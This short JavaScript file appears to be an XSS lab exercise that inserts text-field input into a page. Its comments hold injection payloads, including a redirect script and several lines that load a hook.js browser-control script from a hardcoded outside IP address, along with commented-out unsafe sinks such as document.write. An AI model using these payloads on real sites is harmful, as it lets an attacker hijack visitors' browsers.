
var userinput;
/*$(document).ready(function () {

    $("#bt1").click(function () {

        getpoke();
    });

})*/

function getpoke(){
    userinputtext= document.getElementById("text1").value;

    /*
    <script>
        var stateObj = { foo: "bar" };

        history.pushState(stateObj, "page 2", "www.google.dk");
    </script>
    */
    //$( "#body" ).append( userinputtext );
    //document.write(userinputtext);
    //location.reload();
    document.getElementById("body").appendChild(document.createTextNode(userinputtext));

    //<script>window.location.replace("https://www.google.dk/")</script>

    //hook location
    //http://35.204.168.251:3000/hook.js
    //
    // <script src="http://35.204.168.251:3000/hook.js" type="text/javascript"><\/script>
    /*
    Command in textfield
    <script>
		var commandModuleStr = '<script src="http://35.204.168.251:3000/hook.js" type="text/javascript"><\/script>';
		document.write(commandModuleStr);
	</script>
     */

}
